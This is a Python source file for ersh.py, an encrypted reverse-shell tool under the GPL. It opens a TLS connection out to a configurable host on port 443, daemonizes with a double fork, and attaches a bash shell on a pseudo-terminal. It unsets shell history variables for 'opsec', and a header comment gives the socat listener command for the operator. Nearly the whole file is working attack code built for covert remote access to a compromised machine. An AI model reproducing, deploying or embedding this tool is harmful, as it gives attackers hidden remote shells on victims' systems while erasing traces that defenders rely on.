#!/usr/bin/python
"""
ersh.py by @JusticeRage, python3 port by @icewzl

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
"""

###############################################################################
# Reverse listener command:
# socat openssl-listen:443,reuseaddr,cert=server.pem,cafile=client.crt,openssl-min-proto-version=TLS1.3 file:`tty`,raw,echo=0
###############################################################################

###############################################################################
# EDIT THE PARAMETERS BELOW THIS LINE
###############################################################################

HOST = ""
PORT = 443
SHELL = ["/bin/bash", "--noprofile"]
#Do all unsets, it doesnt hurt / alter opsec to do them all, missing one is not good
FIRST_COMMAND = "unset HISTFILE HISTSIZE HISTFILESIZE PROMPT_COMMAND"

# openssl genrsa -out client.key 2048
client_key = """-----BEGIN PRIVATE KEY-----
-----END PRIVATE KEY-----"""

# openssl req -new -key client.key -x509 -days 50 -out client.crt
client_crt = """-----BEGIN CERTIFICATE-----
-----END CERTIFICATE-----"""

# openssl genrsa -out server.key 2048
# openssl req -new -key server.key -x509 -days 50 -out server.crt
server_crt = """-----BEGIN CERTIFICATE-----
-----END CERTIFICATE-----"""

###############################################################################
# EDIT THE PARAMETERS ABOVE THIS LINE
###############################################################################

import os
import pty
import select
import socket
import ssl
import subprocess
import sys
import tempfile
import time

GREEN = '\033[92m'
RED = '\033[91m'
END = '\033[0m'

def red(text): return RED + text + END
def green(text): return GREEN + text + END
def error(text): return "[" + red("!") + "] " + red("Error: " + text)
def success(text): return "[" + green("*") + "] " + green(text)

def get_safe_mountpoint():
    """
    Looks for tmpfs filesystems mounted as rw to work in as they won't cause
    any data to be written to the hard drive.
    :return: A mountpoint where files can be written temporarily.
    """
    p = subprocess.Popen(["mount", "-t", "tmpfs"], stdout=subprocess.PIPE)
    candidates, stderr = p.communicate()
    candidates = candidates.decode()
    candidates = filter(lambda x: "rw" in x, candidates.split('\n'))
    for c in candidates:
        # Assert that the output of mount is sane
        device = c.split(" ")[2]
        if device[0] != '/':
            print(error("{} doesn't seem to be a mountpoint...".format(device)))
            continue

        # Check that we have sufficient rights to create files there.
        if not os.access(device, os.W_OK):
            continue

        # Verify that there is some space left on the device:
        statvfs = os.statvfs(device)
        if statvfs.f_bfree < 1000:  # Require at least 1000 free blocks
            continue

        return device

    return tempfile.gettempdir()

# -----------------------------------------------------------------------------

def establish_connection():
    """
    This function establishes an SSL connection to the remote host.
    :return: A connected socket if the connection attempt was successful, or None.
    """
    tmpfs = get_safe_mountpoint()
    (c_key, c_crt, s_crt) = (tempfile.NamedTemporaryFile(dir=tmpfs),
                             tempfile.NamedTemporaryFile(dir=tmpfs),
                             tempfile.NamedTemporaryFile(dir=tmpfs))
    # I wish I didn't have to write the certs to disk, but the API leaves me no choice at all.
    try:
        c_key.write(bytes(client_key, "utf-8"))
        c_key.flush()
        c_crt.write(bytes(client_crt, "utf-8"))
        c_crt.flush()
        s_crt.write(bytes(server_crt, "utf-8"))
        s_crt.flush()
        s = ssl.wrap_socket(socket.socket(socket.AF_INET, socket.SOCK_STREAM),
                            keyfile=c_key.name,
                            certfile=c_crt.name,
                            ca_certs=s_crt.name)

        s.connect((HOST, PORT))
        return s
    except Exception as e:
        print(error("Could not connect to {}:{}!{} ({})".format(HOST, PORT, END, e)))
        return None
    finally:
        c_key.close()
        c_crt.close()
        s_crt.close()

# -----------------------------------------------------------------------------

def daemonize():
    def fork():
        try:
            pid = os.fork()
            if pid > 0:
                # Exit parent
                sys.exit(0)
        except OSError as e:
            print(error("Error while forking! ({})".format(e.message)))
            sys.exit(1)

    # Double fork to daemonize
    fork()
    os.setsid()
    os.umask(0)
    fork()

###############################################################################
# Main
###############################################################################

def main():
    s = establish_connection()
    if s is None:
        return -1
    print(success("Connection established!"))
    daemonize()

    master, slave = pty.openpty()
    bash = subprocess.Popen(SHELL,
                            preexec_fn=os.setsid,
                            stdin=slave,
                            stdout=slave,
                            stderr=slave,
                            universal_newlines=True)
    time.sleep(1)  # Wait for bash to start before sending data to it.
    os.write(master, bytes("{}\n".format(FIRST_COMMAND), encoding="utf-8"))

    try:
        while bash.poll() is None:
            r, w, e = select.select([s, master], [], [])

            # SSLSockets don't play nice with select because they buffer data internally.
            # Code taken from https://stackoverflow.com/questions/3187565/select-and-ssl-in-python.
            if s in r:
                try:
                    data = s.recv(1024)
                except ssl.SSLError as e:
                    if e.errno == ssl.SSL_ERROR_WANT_READ:
                        continue
                    raise
                if not data:  # End of file.
                    break
                data_left = s.pending()
                while data_left:
                    data += s.recv(data_left)
                    data_left = s.pending()
                os.write(master, data)
            elif master in r:
                s.write(os.read(master, 2048))
    finally:
        s.close()

if __name__ == "__main__":
    main()
